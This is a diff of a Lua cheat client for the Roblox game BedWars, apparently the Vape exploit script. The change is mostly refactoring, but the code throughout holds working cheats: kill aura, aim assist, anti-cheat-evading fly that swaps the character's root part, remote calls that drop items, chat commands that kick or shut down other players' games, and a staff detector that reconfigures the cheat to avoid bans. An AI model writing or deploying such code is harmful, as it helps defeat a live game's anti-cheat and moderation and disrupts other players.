@@ -1715,11 +1642,21 @@ runFunction(function()
 								badUtterances = {},
 								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
 							},
-							termsActivated = shutTheFuckUp,
-							communityGuidelinesActivated = shutTheFuckUp,
-							supportFormActivated = shutTheFuckUp,
-							reactivateAccountActivated = shutTheFuckUp,
-							logoutCallback = shutTheFuckUp,
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
 							globalGuiInset = {
 								top = 0
 							}
@@ -1741,7 +1678,7 @@ runFunction(function()
 					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
 					task.wait(1)
 				end
-				for i,v in next, (bedwarsStore.localInventory.inventory.items) do 
+				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
 					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
 						item = v.tool,
 						amount = v.amount ~= math.huge and v.amount or 99999999
@@ -1804,7 +1741,7 @@ runFunction(function()
 				end
 			end,
 			deletemap = function(args)
-				for i,v in next, (collectionService:GetTagged("block")) do
+				for i,v in pairs(collectionService:GetTagged("block")) do
 					v:Destroy()
 				end
 			end,
@@ -1841,7 +1778,7 @@ runFunction(function()
 			end,
 			kick = function(args)
 				local str = ""
-				for i,v in next, (args) do
+				for i,v in pairs(args) do
 					str = str..v..(i > 1 and " " or "")
 				end
 				task.spawn(function()
@@ -1860,7 +1797,7 @@ runFunction(function()
 			end,
 			monkey = function(args)
 				local str = ""
-				for i,v in next, (args) do
+				for i,v in pairs(args) do
 					str = str..v..(i > 1 and " " or "")
 				end
 				if str == "" then str = "skill issue" end
@@ -1909,14 +1846,14 @@ runFunction(function()
 			enable = function(args)
 				if #args >= 1 then
 					if args[1]:lower() == "all" then
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
 								v.Api.ToggleButton()
 							end
 						end
 					else
 						local module
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
 								module = v
 								break
@@ -1931,14 +1868,14 @@ runFunction(function()
 			disable = function(args)
 				if #args >= 1 then
 					if args[1]:lower() == "all" then
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
 								v.Api.ToggleButton()
 							end
 						end
 					else
 						local module
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
 								module = v
 								break
@@ -1953,14 +1890,14 @@ runFunction(function()
 			toggle = function(args)
 				if #args >= 1 then
 					if args[1]:lower() == "all" then
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" and i ~= "Panic" then
 								v.Api.ToggleButton()
 							end
 						end
 					else
 						local module
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
 								module = v
 								break
@@ -1992,7 +1929,7 @@ runFunction(function()
 					end
 					if plrtag then
 						props.PrefixText = message.PrefixText
-						for i, v in next, (plrtag) do 
+						for i, v in pairs(plrtag) do 
 							props.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.text.."]</font> "..props.PrefixText
 						end
 					end
@@ -2003,11 +1940,15 @@ runFunction(function()
 						if WhitelistFunctions.LocalPriority > 0 then
 							if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
 								local tab = {}
-								for i,v in next, (vapePrivateCommands) do
+								for i,v in pairs(vapePrivateCommands) do
 									table.insert(tab, i)
 								end
 								table.sort(tab)
-								MessageHandler:publish(";"..table.concat(tab, "\n;"), "vapeCommands") -- modification
+								local str = ""
+								for i,v in pairs(tab) do
+									str = str..";"..v.."\n"
+								end
+								message.TextChannel:DisplaySystemMessage(str)
 							end
 						end
 					else
@@ -2024,7 +1965,7 @@ runFunction(function()
 							table.remove(args, 1)
 							local chosenplayers = findplayers(args[1], plr)
 							table.remove(args, 1)
-							for i,v in next, (vapePrivateCommands) do
+							for i,v in pairs(vapePrivateCommands) do
 								if message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() then
 									message.Text = ""
 									if table.find(chosenplayers, lplr) then
@@ -2075,7 +2016,7 @@ runFunction(function()
 			end
 		end
 
-		for i,v in next, (playersService:GetPlayers()) do task.spawn(newPlayer, v) end
+		for i,v in pairs(playersService:GetPlayers()) do task.spawn(newPlayer, v) end
 		table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(v)
 			task.spawn(newPlayer, v)
 		end))
@@ -2085,6 +2026,7 @@ runFunction(function()
 		bedwars.ZephyrController.updateJump = oldZephyrUpdate
 		getmetatable(bedwars.ClientHandler).Get = oldRemoteGet
 		bedwarsStore.blockPlacer:disable()
+		textChatService.OnIncomingMessage = nil
 	end)
 	
 	local teleportedServers = false
@@ -2201,15 +2143,10 @@ do
 						table.insert(newent.Connections, hum.AnimationPlayed:Connect(function(state) 
 							local animnum = tonumber(({state.Animation.AnimationId:gsub("%D+", "")})[1])
 							if animnum then
-								local cached = entityLibrary.animationCache[state.Animation.AnimationId] -- modification (you have a self ddos or some shi)
-								if not cached then 
-									local success, cached = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(animnum) end)
-									if not success then
-										cached = nil
-									end
-									entityLibrary.animationCache[state.Animation.AnimationId] = cached
+								if not entityLibrary.animationCache[state.Animation.AnimationId] then 
+									entityLibrary.animationCache[state.Animation.AnimationId] = game:GetService("MarketplaceService"):GetProductInfo(animnum)
 								end
-								if cached and cached.Name:lower():find("jump") then
+								if entityLibrary.animationCache[state.Animation.AnimationId].Name:lower():find("jump") then
 									newent.Jumps = newent.Jumps + 1
 								end
 							end
@@ -2290,7 +2227,7 @@ do
 			if entityLibrary.isAlive then
 				entityLibrary.groundTick = entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air and tick() or entityLibrary.groundTick
 			end
-			for i,v in next, (entityLibrary.entityList) do 
+			for i,v in pairs(entityLibrary.entityList) do 
 				local state = v.Humanoid:GetState()
 				v.JumpTick = (state ~= Enum.HumanoidStateType.Running and state ~= Enum.HumanoidStateType.Landed) and tick() or v.JumpTick
 				v.Jumping = (tick() - v.JumpTick) < 0.2 and v.Jumps > 1
@@ -2298,7 +2235,7 @@ do
 					v.Jumps = 0
 				end
 			end
-		until not _VapeApi.vapeInjected
+		until not vapeInjected
 	end)
 	local textlabel = Instance.new("TextLabel")
 	textlabel.Size = UDim2.new(1, 0, 0, 36)
@@ -2343,7 +2280,7 @@ runFunction(function()
 		bootssquare.BackgroundTransparency = bkgcheck and 1 or 0
 		uselesssquare.BackgroundTransparency = bkgcheck and 1 or 0
 		pcall(function()
-			for i,v in next, (vapeTargetInfo.Targets) do
+			for i,v in pairs(shared.VapeTargetInfo.Targets) do
 				local inventory = bedwarsStore.inventories[v.Player] or {}
 					if inventory.hand then
 						handsquare.Image = bedwars.getIcon(inventory.hand, true)
@@ -2438,13 +2375,13 @@ runFunction(function()
 	AimAssistTargetFrame = AimAssist.CreateTargetWindow({Default3 = true})
 	AimAssistClickAim = AimAssist.CreateToggle({
 		Name = "Click Aim",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true,
 		HoverText = "Only aim while mouse is down"
 	})
 	AimAssistStrafe = AimAssist.CreateToggle({
 		Name = "Strafe increase",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Increase speed while strafing away from target"
 	})
 	AimSpeed = AimAssist.CreateSlider({
@@ -2466,12 +2403,12 @@ runFunction(function()
 
 	local function isNotHoveringOverGui()
 		local mousepos = inputService:GetMouseLocation() - Vector2.new(0, 36)
-		for i,v in next, (lplr.PlayerGui:GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
+		for i,v in pairs(lplr.PlayerGui:GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
 			if v.Active then
 				return false
 			end
 		end
-		for i,v in next, (game:GetService("CoreGui"):GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
+		for i,v in pairs(game:GetService("CoreGui"):GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
 			if v.Parent:IsA("ScreenGui") and v.Parent.Enabled then
 				if v.Active then
 					return false
@@ -2549,11 +2486,11 @@ runFunction(function()
 	})
 	autoclickertimed = autoclicker.CreateToggle({
 		Name = "Timed",
-		Function = blankFunction
+		Function = function() end
 	})
 	autoclickerblocks = autoclicker.CreateToggle({
 		Name = "Place Blocks", 
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true,
 		HoverText = "Automatically places blocks when left click is held."
 	})
@@ -2714,8 +2651,8 @@ runFunction(function()
 					end
 					if AutoLeaveStaff2.Enabled then 
 						warningNotification("Vape", "Staff Detected : "..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name).." : Play legit like nothing happened to have the highest chance of not getting banned.", 60)
-						GuiLibrary.SaveSettings = blankFunction
-						for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
+						GuiLibrary.SaveSettings = function() end
+						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
 							if v.Type == "OptionsButton" then
 								if table.find(flyAllowedmodules, i:gsub("OptionsButton", "")) == nil and tostring(v.Object.Parent.Parent):find("Render") == nil then
 									if v.Api.Enabled then
@@ -2744,7 +2681,7 @@ runFunction(function()
 
 	local function isEveryoneDead()
 		if #bedwars.ClientStoreHandler:getState().Party.members > 0 then
-			for i,v in next, (bedwars.ClientStoreHandler:getState().Party.members) do
+			for i,v in pairs(bedwars.ClientStoreHandler:getState().Party.members) do
 				local plr = playersService:FindFirstChild(v.name)
 				if plr and isAlive(plr, true) then
 					return false
@@ -2771,7 +2708,7 @@ runFunction(function()
 								else
 									if AutoLeaveRandom.Enabled then 
 										local listofmodes = {}
-										for i,v in next, (bedwars.QueueMeta) do
+										for i,v in pairs(bedwars.QueueMeta) do
 											if not v.disabled and not v.voiceChatOnly and not v.rankCategory then table.insert(listofmodes, i) end
 										end
 										bedwars.LobbyClientEvents:joinQueue(listofmodes[math.random(1, #listofmodes)])
@@ -2795,7 +2732,7 @@ runFunction(function()
 							if bedwars.ClientStoreHandler:getState().Party.queueState == 0 then
 								if AutoLeaveRandom.Enabled then 
 									local listofmodes = {}
-									for i,v in next, (bedwars.QueueMeta) do
+									for i,v in pairs(bedwars.QueueMeta) do
 										if not v.disabled and not v.voiceChatOnly and not v.rankCategory then table.insert(listofmodes, i) end
 									end
 									bedwars.LobbyClientEvents:joinQueue(listofmodes[math.random(1, #listofmodes)])
@@ -2807,7 +2744,7 @@ runFunction(function()
 					end
 				end))
 				table.insert(AutoLeave.Connections, playersService.PlayerAdded:Connect(autoLeaveAdded))
-				for i, plr in next, (playersService:GetPlayers()) do
+				for i, plr in pairs(playersService:GetPlayers()) do
 					autoLeaveAdded(plr)
 				end
 			end
@@ -2819,12 +2756,12 @@ runFunction(function()
 		Min = 0,
 		Max = 50,
 		Default = 0,
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Delay before going back to the hub."
 	})
 	AutoPlayAgain = AutoLeave.CreateToggle({
 		Name = "Play Again",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Automatically queues a new game.",
 		Default = true
 	})
@@ -2840,7 +2777,7 @@ runFunction(function()
 	})
 	AutoLeaveStaff2 = AutoLeave.CreateToggle({
 		Name = "Staff AutoConfig",
-		Function = blankFunction,
+		Function = function() end,
 		HoverText = "Instead of uninjecting, It will now reconfig vape temporarily to a more legit config.",
 		Default = true
 	})
@@ -2922,7 +2859,7 @@ runFunction(function()
 		Min = 0,
 		Max = 40,
 		Default = 0,
-		Function = blankFunction
+		Function = function() end
 	})
 end)
 
@@ -2964,7 +2901,7 @@ runFunction(function()
 		Function = function(callback)
 			if callback then
 				olddeflate = bedwars.BalloonController.deflateBalloon
-				bedwars.BalloonController.deflateBalloon = blankFunction
+				bedwars.BalloonController.deflateBalloon = function() end
 
 				table.insert(Fly.Connections, inputService.InputBegan:Connect(function(input1)
 					if FlyVertical.Enabled and inputService:GetFocusedTextBox() == nil then
@@ -3028,7 +2965,7 @@ runFunction(function()
 					FlyAnywayProgressBarFrame.Frame:TweenSize(UDim2.new(1, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0, true)
 				end
 
-				groundtime = tick() + (2.6 + (entityLibrary.groundTick - tick()))
+				groundtime = tick() + (1.4 + (entityLibrary.groundTick - tick()))
 				FlyCoroutine = coroutine.create(function()
 					repeat
 						repeat task.wait() until (groundtime - tick()) < 0.6 and not onground
@@ -3076,7 +3013,7 @@ runFunction(function()
 							onground = newray and true or false
 							if lastonground ~= onground then 
 								if (not onground) then 
-									groundtime = tick() + (2.6 + (entityLibrary.groundTick - tick()))
+									groundtime = tick() + (1.4 + (entityLibrary.groundTick - tick()))
 									if FlyAnywayProgressBarFrame then 
 										FlyAnywayProgressBarFrame.Frame:TweenSize(UDim2.new(0, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, groundtime - tick(), true)
 									end
@@ -3095,9 +3032,9 @@ runFunction(function()
 							lastonground = true
 						end
 
-						local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (FlyMode.Value == "Normal" and FlySpeed.Value or 20) * (_VapeApi.NoMove and 0 or 1)
+						local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (FlyMode.Value == "Normal" and FlySpeed.Value or 20)
 						entityLibrary.character.HumanoidRootPart.Velocity = flyVelocity + (Vector3.new(0, playerMass + (FlyUp and FlyVerticalSpeed.Value or 0) + (FlyDown and -FlyVerticalSpeed.Value or 0), 0))
-						if FlyMode.Value ~= "Normal" and not _VapeApi.NoMove then
+						if FlyMode.Value ~= "Normal" then
 							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * ((FlySpeed.Value + getSpeed()) - 20)) * delta
 						end
 					end
@@ -3126,7 +3063,7 @@ runFunction(function()
 		end,
 		HoverText = "Makes you go zoom (longer Fly discovered by exelys and Cqded)",
 		ExtraText = function() 
-			return "Heatseeker"
+			return "CFrame"
 		end
 	})
 	FlySpeed = Fly.CreateSlider({
@@ -3145,12 +3082,12 @@ runFunction(function()
 	})
 	FlyVertical = Fly.CreateToggle({
 		Name = "Y Level",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 	FlyAutoPop = Fly.CreateToggle({
 		Name = "Pop Balloon",
-		Function = blankFunction, 
+		Function = function() end, 
 		HoverText = "Pops balloons when Fly is disabled."
 	})
 	local oldcamupdate
@@ -3166,7 +3103,7 @@ runFunction(function()
 				task.spawn(function()
 					repeat
 						task.wait(0.1)
-						for i,v in next, (getconnections(gameCamera:GetPropertyChangedSignal("CameraType"))) do 
+						for i,v in pairs(getconnections(gameCamera:GetPropertyChangedSignal("CameraType"))) do 
 							if v.Function then
 								camcontrol = debug.getupvalue(v.Function, 1)
 							end
@@ -3209,7 +3146,7 @@ runFunction(function()
 	})
 	Flydamagecamera = Fly.CreateToggle({
 		Name = "Camera Animation",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 	Flydamagecamera.Object.BorderSizePixel = 0
@@ -3255,7 +3192,7 @@ runFunction(function()
 	})
 	FlyTP = Fly.CreateToggle({
 		Name = "TP Down",
-		Function = blankFunction,
+		Function = function() end,
 		Default = true
 	})
 end)
@@ -3332,8 +3269,6 @@ runFunction(function()
 	})
 end)
 
-local oldcloneroot -- modification
-local canpingbypass = true
 runFunction(function()
 	local InfiniteFly = {Enabled = false}
 	local InfiniteFlyMode = {Value = "CFrame"}
@@ -3345,6 +3280,7 @@ runFunction(function()
 	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}
 	local clonesuccess = false
 	local disabledproper = true
+	local oldcloneroot
 	local cloned
 	local clone
 	local bodyvelo
@@ -3358,40 +3294,35 @@ runFunction(function()
 		RunLoops:UnbindFromHeartbeat("InfiniteFlyOff")
 		disabledproper = true
 		if not oldcloneroot or not oldcloneroot.Parent then return end
+		lplr.Character.Parent = game
+		oldcloneroot.Parent = lplr.Character
+		lplr.Character.PrimaryPart = oldcloneroot
+		lplr.Character.Parent = workspace
+		oldcloneroot.CanCollide = true
+		for i,v in pairs(lplr.Character:GetDescendants()) do 
+			if v:IsA("Weld") or v:IsA("Motor6D") then 
+				if v.Part0 == clone then v.Part0 = oldcloneroot end
+				if v.Part1 == clone then v.Part1 = oldcloneroot end
+			end
+			if v:IsA("BodyVelocity") then 
+				v:Destroy()
+			end
+		end
+		for i,v in pairs(oldcloneroot:GetChildren()) do 
+			if v:IsA("BodyVelocity") then 
+				v:Destroy()
+			end
+		end
 		local oldclonepos = clone.Position.Y
-		if shared.pingbypassroot == nil then
-			lplr.Character.Parent = game
-			oldcloneroot.Parent = lplr.Character
-			lplr.Character.PrimaryPart = oldcloneroot
-			lplr.Character.Parent = workspace
-			oldcloneroot.CanCollide = true
-			for i,v in next, (lplr.Character:GetDescendants()) do 
-				if v:IsA("Weld") or v:IsA("Motor6D") then 
-					if v.Part0 == clone then v.Part0 = oldcloneroot end
-					if v.Part1 == clone then v.Part1 = oldcloneroot end
-				end
-				if v:IsA("BodyVelocity") then 
-					v:Destroy()
-				end
-			end
-			for i,v in next, (oldcloneroot:GetChildren()) do 
-				if v:IsA("BodyVelocity") then 
-					v:Destroy()
-				end
-			end
-			if clone then 
-				clone:Destroy()
-				clone = nil
-			end
+		if clone then 
+			clone:Destroy()
+			clone = nil
 		end
 		lplr.Character.Humanoid.HipHeight = hip or 2
 		local origcf = {oldcloneroot.CFrame:GetComponents()}
 		origcf[2] = oldclonepos
 		oldcloneroot.CFrame = CFrame.new(unpack(origcf))
 		oldcloneroot = nil
-		task.delay(0.5, function()
-			canpingbypass = true
-		end)
 	end
 
 	InfiniteFly = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
@@ -3434,47 +3365,39 @@ runFunction(function()
 					end)
 				end
 				clonesuccess = false
-				canpingbypass = false
-				if shared.pingbypassroot == nil then
-					if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) then
-						cloned = lplr.Character
-						oldcloneroot = entityLibrary.character.HumanoidRootPart
-						if not lplr.Character.Parent then 
-							InfiniteFly.ToggleButton(false)
-							return
-						end
-						lplr.Character.Parent = game
-						clone = oldcloneroot:Clone()
-						clone.Parent = lplr.Character
-						oldcloneroot.Parent = gameCamera
-						bedwars.QueryUtil:setQueryIgnored(oldcloneroot, true)
-						clone.CFrame = oldcloneroot.CFrame
-						lplr.Character.PrimaryPart = clone
-						lplr.Character.Parent = workspace
-						for i,v in next, (lplr.Character:GetDescendants()) do 
-							if v:IsA("Weld") or v:IsA("Motor6D") then 
-								if v.Part0 == oldcloneroot then v.Part0 = clone end
-								if v.Part1 == oldcloneroot then v.Part1 = clone end
-							end
-							if v:IsA("BodyVelocity") then 
-								v:Destroy()
-							end
-						end
-						for i,v in next, (oldcloneroot:GetChildren()) do 
-							if v:IsA("BodyVelocity") then 
-								v:Destroy()
-							end
-						end
-						if hip then 
-							lplr.Character.Humanoid.HipHeight = hip
-						end
-						hip = lplr.Character.Humanoid.HipHeight
-						clonesuccess = true
-					end
-				else
+				if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) then
 					cloned = lplr.Character
-					oldcloneroot = shared.pingbypassroot
-					clone = entityLibrary.character.HumanoidRootPart
+					oldcloneroot = entityLibrary.character.HumanoidRootPart
+					if not lplr.Character.Parent then 
+						InfiniteFly.ToggleButton(false)
+						return
+					end
+					lplr.Character.Parent = game
+					clone = oldcloneroot:Clone()
+					clone.Parent = lplr.Character
+					oldcloneroot.Parent = gameCamera
+					bedwars.QueryUtil:setQueryIgnored(oldcloneroot, true)
+					clone.CFrame = oldcloneroot.CFrame
+					lplr.Character.PrimaryPart = clone
+					lplr.Character.Parent = workspace
+					for i,v in pairs(lplr.Character:GetDescendants()) do 
+						if v:IsA("Weld") or v:IsA("Motor6D") then 
+							if v.Part0 == oldcloneroot then v.Part0 = clone end
+							if v.Part1 == oldcloneroot then v.Part1 = clone end
+						end
+						if v:IsA("BodyVelocity") then 
+							v:Destroy()
+						end
+					end
+					for i,v in pairs(oldcloneroot:GetChildren()) do 
+						if v:IsA("BodyVelocity") then 
+							v:Destroy()
+						end
+					end
+					if hip then 
+						lplr.Character.Humanoid.HipHeight = hip
+					end
+					hip = lplr.Character.Humanoid.HipHeight
 					clonesuccess = true
 				end
 				if not clonesuccess then 
@@ -3488,8 +3411,7 @@ runFunction(function()
 						if bedwarsStore.matchState == 0 then return end
 					end
 					if entityLibrary.isAlive then
-						if isnetworkowner(oldcloneroot) then
-							if _VapeApi.NoMove then return end -- modification
+						if isnetworkowner(oldcloneroot) then 
 							local playerMass = (entityLibrary.character.HumanoidRootPart:GetMass() - 1.4) * (delta * 100)
 							
 							local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (InfiniteFlyMode.Value == "Normal" and InfiniteFlySpeed.Value or 20)
@@ -3515,7 +3437,7 @@ runFunction(function()
 				end)
 			else
 				RunLoops:UnbindFromHeartbeat("InfiniteFly")
-				if clonesuccess and oldcloneroot and clone and lplr.Character.Parent == workspace and oldcloneroot.Parent ~= nil and disabledproper and cloned == lplr.Character then
+				if clonesuccess and oldcloneroot and clone and lplr.Character.Parent == workspace and oldcloneroot.Parent ~= nil and disabledproper and cloned == lplr.Character then 
 					local rayparams = RaycastParams.new()
 					rayparams.FilterDescendantsInstances = {lplr.Character, gameCamera}
 					rayparams.RespectCanCollide = true
@@ -3538,7 +3460,7 @@ runFunction(function()
 							local newcf = CFrame.new(unpack(bruh))
 							FlyOverlap.FilterDescendantsInstances = {lplr.Character, gameCamera}
 							local allowed = true
-							for i,v in next, (workspace:GetPartBoundsInRadius(newcf.p, 2, FlyOverlap)) do 
+							for i,v in pairs(workspace:GetPartBoundsInRadius(newcf.p, 2, FlyOverlap)) do 
 								if (v.Position.Y + (v.Size.Y / 2)) > (newcf.p.Y + 0.5) then 
 									allowed = false
 									break
@@ -3565,7 +3487,7 @@ runFunction(function()
 		end,
 		HoverText = "Makes you go zoom",
 		ExtraText = function()
-			return "Heatseeker"
+			return "CFrame"
 		end
 	})
 	InfiniteFlySpeed = InfiniteFly.CreateSlider({
@@ -3584,12 +3506,12 @@ runFunction(function()
 	})
 	InfiniteFlyVertical = InfiniteFly.CreateToggle({
 		Name = "Y Level",
-		Function = blankFunction, 
+		Function = function() end, 
 		Default = true
 	})
 end)
 
-_VapeApi.killauraNearPlayer = nil
+local killauraNearPlayer
 runFunction(function()
 	local killauraboxes = {}
     local killauratargetframe = {Players = {Enabled = false}}
@@ -3623,8 +3545,8 @@ runFunction(function()
 	local killauraparticlepart
     local Killauranear = false
     local killauraplaying = false
-    local oldViewmodelAnimation = blankFunction
-    local oldPlaySound = blankFunction
+    local oldViewmodelAnimation = function() end
+    local oldPlaySound = function() end
     local originalArmC0 = nil
 	local killauracurrentanim
 	local animationdelay = tick()
@@ -3634,14 +3556,14 @@ runFunction(function()
 		local strength = 0
 		local strongestsword = 0
 		if inv then
-			for i,v in next, (inv.items) do 
+			for i,v in pairs(inv.items) do 
 				local itemmeta = bedwars.ItemTable[v.itemType]
 				if itemmeta and itemmeta.sword and itemmeta.sword.damage > strongestsword then 
 					strongestsword = itemmeta.sword.damage / 100
 				end	
 			end
 			strength = strength + strongestsword
-			for i,v in next, (inv.armor) do 
+			for i,v in pairs(inv.armor) do 
 				local itemmeta = bedwars.ItemTable[v.itemType]
 				if itemmeta and itemmeta.armor then 
 					strength = strength + (itemmeta.armor.damageReductionMultiplier or 0)
@@ -3662,7 +3584,7 @@ runFunction(function()
 
 	local killaurasortmethods = {
 		Distance = function(a, b)
-			return (a.RootPart.Position - (shared.pingbypassroot and shared.pingbypassroot.Position or entityLibrary.character.HumanoidRootPart.Position)).Magnitude < (b.RootPart.Position - (shared.pingbypassroot and shared.pingbypassroot.Position or entityLibrary.character.HumanoidRootPart.Position)).Magnitude
+			return (a.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).Magnitude < (b.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).Magnitude
 		end,
 		Health = function(a, b) 
 			return a.Humanoid.Health < b.Humanoid.Health
@@ -3710,221 +3632,8 @@ runFunction(function()
 			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.1},
 			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
 			{CFrame = CFrame.new(0.63, -0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.15}
-		},
-		AstralOld = { -- modification
-			{CFrame = CFrame.new(0.8, -1.7, -1.8) * CFrame.Angles(-math.rad(190), math.rad(70), -math.rad(90)), Time = 0.18},
-			{CFrame = CFrame.new(0.7, -1.3, 0.1) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.18},
-		},
-		Sigma2 = { -- modification
-			{CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.16},
-			{CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(30), math.rad(111), math.rad(190)), Time = 0.16},
-		},
-		Cockless = { -- modification
-			{CFrame = CFrame.new(1, -0.71, -0.2) * CFrame.Angles(math.rad(268), math.rad(54), math.rad(327)), Time = 0.17},
-			{CFrame = CFrame.new(0.6, -0.71, -0.2) * CFrame.Angles(math.rad(189), math.rad(52), math.rad(347)), Time = 0.16},
-		},
+		}
 	}
-
-	local meteorAnimations = {
-		Flat = {
-			{CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(-30), math.rad(-80)), Time = 0.15},
-			{CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(30), math.rad(-100)), Time = 0.15},
-		},
-		["Horizontal Spin"] = {
-			{CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-80)), Time = 0.14},
-			{CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(-100)), Time = 0.14},
-			{CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(180), math.rad(-100)), Time = 0.14},
-			{CFrame = CFrame.new(0.69, 0.7, 0.6) * CFrame.Angles(math.rad(-90), math.rad(270), math.rad(-80)), Time = 0.14},
-		},
-		["Slow Tap"] = {
-			{CFrame = {X = 1, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))},Time = 0.25, RealDelay = 0.25},
-			{CFrame = {X = 1, Y = 0, Z = -0.3, Angle = CFrame.Angles(math.rad(-90), math.rad(-15), math.rad(-10))},Time = 0.25, RealDelay = 0.25},
-		},
-		["Fast Tap"] = {
-			{CFrame = {X = 1, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))},Time = 0.2, RealDelay = 0.2},
-			{CFrame = {X = 1, Y = 0, Z = -0.3, Angle = CFrame.Angles(math.rad(-90), math.rad(-15), math.rad(-10))},Time = 0.05, RealDelay = 0.05},
-		},
-		["Exhibition2"] = {
-			["Main"] = {
-				{CFrame = {X = 1, Y = 0, Z = 0, Angle = CFrame.Angles(math.rad(-40), math.rad(40), math.rad(-80))},Time = 0.12, RealDelay = 0.12},
-				{CFrame = {X = 1, Y = 0, Z = -0.3, Angle = CFrame.Angles(math.rad(-80), math.rad(40), math.rad(-60))},Time = 0.16, RealDelay = 0.16},
-			},
-		},
-		 ["Old Extend"] = {
-				{CFrame = CFrame.new(3, 0, 1) * CFrame.Angles(math.rad(-60), math.rad(30), math.rad(-40)), Time = 0.1},
-				{CFrame = CFrame.new(3.3, -.2, 0.7) * CFrame.Angles(math.rad(-70), math.rad(10), math.rad(-20)), Time = 0.2},
-				{CFrame = CFrame.new(3.8, -.2, 1.3) * CFrame.Angles(math.rad(-80), math.rad(0), math.rad(-20)), Time = 0.01},
-				--{CFrame = CFrame.new(3, .3, 1.3) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-20)), Time = 0.07},
-				--{CFrame = CFrame.new(3, .3, .8) * CFrame.Angles(math.rad(-90), math.rad(10), math.rad(-40)), Time = 0.07},
-		},
-		["Jab"] = {
-			["Main"] = {
